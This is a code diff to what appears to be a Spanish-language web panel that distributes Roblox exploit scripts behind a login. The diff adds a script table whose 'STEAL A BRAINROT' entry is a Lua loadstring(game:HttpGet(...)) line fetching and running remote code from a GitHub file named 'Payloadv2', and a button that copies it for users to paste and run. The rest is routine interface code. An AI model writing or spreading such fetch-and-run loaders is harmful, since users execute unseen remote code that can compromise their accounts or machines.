@@ -389,13 +389,62 @@
     revisar();
   }
 
+  const SCRIPTS = {
+    "STEAL A BRAINROT": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/itdoesntexist1/Payloadv2./refs/heads/main/Payloadv2."))()',
+    "ROBA UN HUEVO": "",
+    "BLOCK SPIN": ""
+  };
+
   function mostrarScriptBloqueado(panel) {
     document.getElementById("login").style.display = "none";
     document.getElementById("contenido").style.display = "none";
     document.getElementById("panel-acceso").style.display = "none";
     document.getElementById("panel-script").style.display = "block";
-    document.getElementById("script-caja").textContent = "Panel: " + panel + "\n\nEsperando script...";
+
+    const script = SCRIPTS[panel] || "";
+    const caja = document.getElementById("script-caja");
+    const btnCopiar = document.getElementById("copiar-script");
+    const msg = document.getElementById("copiar-msg");
+
+    if (script) {
+      caja.textContent = script;
+      btnCopiar.style.display = "block";
+      msg.textContent = "";
+    } else {
+      caja.textContent = "Panel: " + panel + "\n\nScript aún no disponible.";
+      btnCopiar.style.display = "none";
+      msg.textContent = "";
+    }
   }
+
+  document.getElementById("copiar-script").addEventListener("click", function () {
+    const texto = document.getElementById("script-caja").textContent;
+    const msg = document.getElementById("copiar-msg");
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(texto).then(function () {
+        msg.style.color = "#43b581";
+        msg.textContent = "¡Copiado!";
+      }).catch(function () {
+        msg.style.color = "#ff6b6b";
+        msg.textContent = "No se pudo copiar";
+      });
+    } else {
+      // Fallback
+      var ta = document.createElement("textarea");
+      ta.value = texto;
+      document.body.appendChild(ta);
+      ta.select();
+      try {
+        document.execCommand("copy");
+        msg.style.color = "#43b581";
+        msg.textContent = "¡Copiado!";
+      } catch (e) {
+        msg.style.color = "#ff6b6b";
+        msg.textContent = "No se pudo copiar";
+      }
+      document.body.removeChild(ta);
+    }
+  });
 
   document.getElementById("gift-enviar").addEventListener("click", function () {
     const btn = this;
